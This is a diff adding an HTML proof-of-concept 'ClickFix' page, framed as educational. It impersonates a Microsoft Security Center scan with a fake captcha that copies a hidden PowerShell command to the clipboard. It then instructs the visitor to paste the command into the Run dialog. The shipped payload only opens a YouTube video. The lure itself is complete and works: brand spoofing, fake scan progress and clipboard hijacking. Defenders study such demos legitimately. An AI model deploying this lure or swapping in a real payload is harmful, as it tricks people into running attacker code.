@@ -1,0 +1,209 @@
+<!-- 
+  =============================================================================
+  PROOF OF CONCEPT: ClickFix, User Execution: Malicious Copy and Paste
+  AUTHOR: Joseph McPeters (liquidsky)
+  DATE: 2/25/2026
+  
+  DISCLAIMER: This code is for EDUCATIONAL and AUTHORIZED SECURITY TESTING 
+  purposes only. Usage of this tool for attacking targets without prior mutual 
+  consent is illegal. It is the end user's responsibility to obey all 
+  applicable local, state, and federal laws.
+  
+  The author assumes no liability and is not responsible for any misuse or 
+  damage caused by this program. This repository is intended to help 
+  defenders understand the ClickFix mechanism and implement 
+  appropriate [Remediation/Detections].
+
+  This is a quick and simple html page that impersonates a security center demonstrating the "ClickFix" issue.
+  The execution harmless payload is simply a YouTube page opens to play Rick Astley "Never gonna give you up" using powershell.
+
+  If for some reason there is a problem (DMCA Policy Contact) please email me: pwn [ at ] mail . LV
+  =============================================================================
+-->
+
+
+<!-- Page.html for Google Apps Script -->
+<head>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <meta name="robots" content="noindex, nofollow">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Action Required</title>
+  <link rel="icon" type="image/png" href="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg">
+  <style>
+    body {
+      font-family: "Segoe UI", Arial, sans-serif;
+      background-color: #F3F3F3;
+      text-align: center;
+      padding-top: 50px;
+      color: white;
+    }
+    .container {
+      background: white;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.1);
+      width: 450px;
+      margin: auto;
+      text-align: left;
+      color: black;
+    }
+    .update-box {
+      background-color: #D3D3D3;
+      padding: 10px;
+      border-radius: 5px;
+      font-size: 16px;
+      text-align: center;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+    h2 { color: #0078D7; font-size: 22px; }
+    .steps { font-size: 14px; color: #333; }
+    .highlight {
+      font-weight: bold;
+      color: #0078D7;
+      background: #E1F0FF;
+      padding: 2px 5px;
+      border-radius: 5px;
+    }
+    .progress-bar {
+      width: 100%;
+      background-color: #ddd;
+      border-radius: 5px;
+      height: 15px;
+      margin-top: 10px;
+      overflow: hidden;
+    }
+    .progress-bar div {
+      height: 100%;
+      width: 0;
+      background-color: #0078D7;
+      transition: width 1s ease-in-out;
+    }
+    .windows-blue-text { color: #0078D7; font-weight: bold; }
+    .footer {
+      text-align: center;
+      font-size: 12px;
+      color: #666;
+      margin-top: 15px;
+      padding: 10px;
+      border-top: 1px solid #ccc;
+      background-color: #f9f9f9;
+    }
+  </style>
+</head>
+<body>
+  <!-- <img src="https://passwordreset.microsoftonline.com/images/header_Microsoft.png"
+       alt="Microsoft Logo" 
+       style="position: absolute; top: 10px; left: 10px; width: 120px; border: 1px solid #444; background-color: rgba(255, 255, 255, 0.1); padding: 5px; border-radius: 5px;"> -->
+  <div class="container">
+    <div class="update-box">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Windows Icon" style="width: 25px; vertical-align: middle; margin-right: 15px;">
+      <span class="windows-blue-text" style="cursor: pointer; text-decoration: underline;">
+        Security Center - Action Required
+      </span>
+    </div>
+
+    <h2 id="scan-title">Smart Screen is scanning the system...</h2>
+    <p id="scan-status">Checking for outdated security products...</p>
+    <div class="progress-bar"><div id="scan-progress"></div></div>
+
+    <div id="update-content" style="display: none;">
+      <center>
+        <button style="display: flex; align-items: center; justify-content: center; width: 300px; height: 50px; border: 1px solid #ccc; border-radius: 5px; background-color: #f9f9f9; font-size: 16px; font-weight: bold; color: #333; cursor: pointer; box-shadow: 0px 2px 2px rgba(0, 0, 0, 0.2);" onclick="copyToClipboardAndShowSteps()">
+          <input type="checkbox" style="margin-right: 10px; transform: scale(1.5);"> I'm not a robot <img src="https://banner2.cleanpng.com/20180818/usg/d50542a1fa28f020430cd096d8e73988.webp" alt="Captcha Logo" style="width: 25px; margin-left: 10px;">
+        </button>
+      </center>
+      <br><br>
+      <div id="instructions" style="display: none; border: 2px solid #0078D7; border-radius: 15px; padding: 15px; background-color: #E1F0FF; text-align: center;">
+        <p class="steps">1️⃣ Press <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Windows Logo" style="width: 17px; vertical-align: middle;"> <span class="highlight">Win + R</span> to open the Run dialog.</p>
+        <p class="steps">2️⃣ Press <span class="highlight">Ctrl + V</span> to paste the update command.</p>
+        <p class="steps">3️⃣ Press <span class="highlight">Enter</span> to apply the update.</p>
+        <br>
+        <p><i class="fas fa-info-circle"></i> After finishing required updates please restart the browser.<br><br><b><center>support@corp.local</center></b></p>
+      </div>
+    </div>
+
+    <p class="footer">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo" style="width: 20px; height: 20px; vertical-align: middle;">
+      © 2025 Microsoft Corporation. All rights reserved.
+    </p>
+  </div>
+
+  <div style="text-align: center; margin-top: 20px; padding: 10px; background-color: #E0E0E0; color: #333; font-size: 14px;">
+    <p><strong>Error:</strong> An unexpected error: Security Updates Required.</p>
+    <p>MSFT Reference ID: <span id="error-uuid"></span></p>
+  </div>
+
+  <script>
+    function copyToClipboardAndShowSteps() {
+      copyToClipboard();
+      document.getElementById('instructions').style.display = 'block';
+    }
+
+    function copyToClipboard() {
+      let textToCopy = 'powershell -NoP -W Hidden -c "Start-Process \"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" -WindowStyle Hidden"';
+
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(textToCopy).catch(err => {
+          fallbackClipboardCopy(textToCopy);
+        });
+      } else {
+        fallbackClipboardCopy(textToCopy);
+      }
+    }
+
+    function fallbackClipboardCopy(text) {
+      let textArea = document.createElement("textarea");
+      textArea.value = text;
+      document.body.appendChild(textArea);
+      textArea.select();
+      document.execCommand("copy");
+      document.body.removeChild(textArea);
+    }
+
+    function runScanAnimation() {
+      let scanProgress = document.getElementById("scan-progress");
+      let scanStatus = document.getElementById("scan-status");
+      let messages = [
+        "20% - Scanning for secure SSL/TLS connection...",
+        "40% - Checking Update definitions...",
+        "60% - Verifying required system files...",
+        "80% - Ensuring compliance with Microsoft Windows...",
+        "100% - Security check complete. Issues found to remediate."
+      ];
+      let progressValues = [20, 40, 60, 80, 100];
+      let index = 0;
+      let scanInterval = setInterval(() => {
+        if (index < messages.length) {
+          scanStatus.textContent = messages[index];
+          scanProgress.style.width = progressValues[index] + "%";
+          index++;
+        } else {
+          clearInterval(scanInterval);
+          showUpdatePrompt();
+        }
+      }, 2000);
+    }
+
+    function showUpdatePrompt() {
+      document.getElementById("scan-title").style.display = "none";
+      document.getElementById("scan-status").style.display = "none";
+      document.querySelector(".progress-bar").style.display = "none";
+      document.getElementById("update-content").style.display = "block";
+    }
+
+    function generateUUID() {
+      return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        var r = Math.random() * 16 | 0,
+            v = c == 'x' ? r : (r & 0x3 | 0x8);
+        return v.toString(16);
+      });
+    }
+
+    window.onload = () => {
+      runScanAnimation();
+      document.getElementById("error-uuid").textContent = generateUUID();
+    };
+  </script>
+</body>
